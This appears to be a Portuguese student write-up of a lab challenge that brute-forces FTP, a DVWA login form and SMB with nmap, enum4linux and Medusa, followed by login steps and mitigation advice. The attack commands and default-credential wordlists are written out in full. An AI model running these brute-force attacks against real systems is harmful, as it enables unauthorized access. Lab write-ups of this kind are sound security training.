# 🛡️ Entrega do Desafio

## 🛠️ Pré-requisitos
    Antes de iniciar, é necessária uma verificação via scanner para certificar-se de que a porta a ser explorada esta aberta.
    Para isso, o comando nmap deve ser executado com o IP do alvo:
    ```nmap -sV -p 21,22,80,445,139 (IP)
    ```

## 🔍 Simulação de Ataques - FTP
    Com a garantia das portas abertas, podemos iniciar com uma simulação de ataque de força bruta afim de coletar login e senhas comuns que possam 
    ser usados para o acesso direto via ftp.
    Usamos a ferramenta Medusa (para exploração via vários protocolos).

    1. Carregamos a lista de logins para nossa tentativa:
     ```echo -e "user/nmsfadmin/nadmin/nroot" > users.txt
     ```

    2. Carregamos a lista de senhas que acompanham esses logins, para nossa tentativa:
     ```echo -e "123456/npassword/nqwerty/nmsfadmin" > pass.txt
     ```

    3. Executamos o comando do Medusa para iniciar a exploração:
    ```medusa -h IP_ALVO -U users.txt -P pass.txt -M ftp -t 6
     ```

## 🔍 Simulação de Ataques - HTTP
    Com a garantia das portas abertas, podemos iniciar com uma simulação de ataque de força bruta em formulários para coletar login e senhas comuns que possam 
    ser usados para o acesso direto em um formulário http de login.
    Usamos novamente a ferramenta Medusa.

    1. Carregamos a lista de logins para nossa tentativa:
     ```echo -e "user/nmsfadmin/nadmin/nroot" > users.txt
     ```

    2. Carregamos a lista de senhas que acompanham esses logins, para nossa tentativa:
     ```echo -e "123456/npassword/nqwerty/nmsfadmin" > pass.txt
     ```

    3. Executamos o comando do Medusa para iniciar a exploração:
    ```medusa -h IP_ALVO -U users.txt -P pass.txt -M http / -m PAGE: '/dvwa/login.php' / -m FORM: 'username=^USER^&password=^PASS^&Login=Login' / -m 'FAIL=Login failed' -t 6
     ```

## 🔍 Simulação de Ataques - SMB
    Com a garantia das portas abertas, podemos iniciar com uma simulação de ataque de força bruta afim de coletar login e senhas comuns que possam 
    ser usados para o acesso direto via SMB usando o Medusa.

    1. Extraimos a lista de usuarios e senhas de um servidor mal configurado via o comando enum4linux:
     ```enum4linux -a IP_ALVO | tee enum4_output.txt
     ```

    2. Carregamos a lista de logins para nossa tentativa:
     ```echo -e "user/nms/nmsfadmin/nservice" > smb_users.txt
     ```

    3. Carregamos a lista de senhas que acompanham esses logins, para nossa tentativa:
     ```echo -e "password/n123456/nWelcome123/nmsfadmin" > senhas_spray.txt
     ```

    4. Executamos o comando do Medusa para iniciar a exploração:
    ```medusa -h IP_ALVO -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
    ```

## 💻 Como Utilizar
    Feita a nossa exploração e obtida as informações de usuario e senha, devemos executar o acesso direto via cada um dos protocolos explorados.

    1. FTP:
     ```ftp IP_ALVO
        -Name: user_encontrado 
        -Password: senha_encontrada
     ```

    2. Acesso via login(WEB Dvwa) via navegador:
     ```URL: IP_ALVO/dvwa/login.php
        -Login: user_encontrado 
        -Password: senha_encontrada
     ```

    3. Acesso via login(SMB):
    ```smbclient -L //IP_ALVO -U user_encontrado    
    -Password: senha_encontrada
    ```

## 💻 Mitigação de falhas 

    Antes de tudo, o admin responsável pelo ambiente digital deve se perguntar se a máquina precisa ou não ter o serviço habilitado ou instalado, e caso tenha
    essa necessidade, deve-se configurar um firewall e antivírus na mesma.

    1. FTP:
     Uso de protocolos de FTP mais seguros como o SFTP, usuarios e senhas mais seguras como senhas longas com alphanuméricos e simbolos,
     mais o uso de certificados para a validação no momento do login.

    2. Acesso via login(WEB Dvwa) via navegador:
    Uso de Login e senha seguros como anteriormente falado, uso de protocolos de segurança como o https, 
    uso de token enviado via e-mail pessoal ou telefone(autentica de dois fatores) e 
    troca de senha a cada x período de tempo determinado pelo admin do ambiente digital ou TI.

    3. Acesso via login(SMB):
    Novamente, deve-se questionar se há a necessidade do ponto(máquina) compartilhar arquivos ou dispositivos com outros computadores da rede, não havendo,
    deve-se desabilitar o serviço e filtrar a porta via firewall.
    Havendo a necessidade, o uso de senhas seguras, antivirus e demais metodos de segurança é bem-vindo.    
